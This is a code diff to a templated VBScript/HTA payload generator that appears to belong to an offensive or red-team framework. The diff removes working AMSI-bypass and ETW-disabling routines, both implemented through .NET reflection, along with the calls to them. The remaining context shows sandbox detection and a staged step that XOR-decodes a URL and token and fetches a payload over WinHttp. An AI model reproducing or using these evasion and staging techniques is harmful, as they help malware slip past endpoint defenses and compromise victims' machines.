@@ -27,25 +27,6 @@ Function {{ v.fn_hex2arr }}(h)
     {{ v.fn_hex2arr }} = {{ v.hta_lv_ha }}
 End Function
 
-Sub {{ v.fn_amsi }}()
-    On Error Resume Next
-    Dim {{ v.hta_lv_aa }}: Set {{ v.hta_lv_aa }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim {{ v.hta_lv_at }}: Set {{ v.hta_lv_at }} = {{ v.hta_lv_aa }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
-    If Not {{ v.hta_lv_at }} Is Nothing Then
-        {{ v.hta_lv_at }}.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), (4 Or 32)).SetValue Nothing, True
-    End If
-End Sub
-
-Sub {{ v.fn_etw }}()
-    On Error Resume Next
-    Dim {{ v.hta_lv_ea }}: Set {{ v.hta_lv_ea }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
-    Dim {{ v.hta_lv_et }}: Set {{ v.hta_lv_et }} = {{ v.hta_lv_ea }}.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
-    If Not {{ v.hta_lv_et }} Is Nothing Then
-        Dim {{ v.hta_lv_ef }}: Set {{ v.hta_lv_ef }} = {{ v.hta_lv_et }}.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), (4 Or 32))
-        If Not {{ v.hta_lv_ef }} Is Nothing Then {{ v.hta_lv_ef }}.SetValue Nothing, 0
-    End If
-End Sub
-
 Function {{ v.fn_sandbox }}()
     {{ v.fn_sandbox }} = False
     On Error Resume Next
@@ -169,9 +150,6 @@ Sub {{ v.sub_run }}()
         Err.Clear
         On Error GoTo 0
     End If
-    Call {{ v.fn_amsi }}()
-    Call {{ v.fn_etw }}()
-
     {% if is_staged %}
     ' Staged: XOR-decode URL/JWT/UA, fetch via WinHttp with Bearer auth.
     Dim {{ sg.sg_lv_url }}, {{ sg.sg_lv_jwt }}, {{ sg.sg_lv_ua }}, {{ sg.sg_lv_i }}
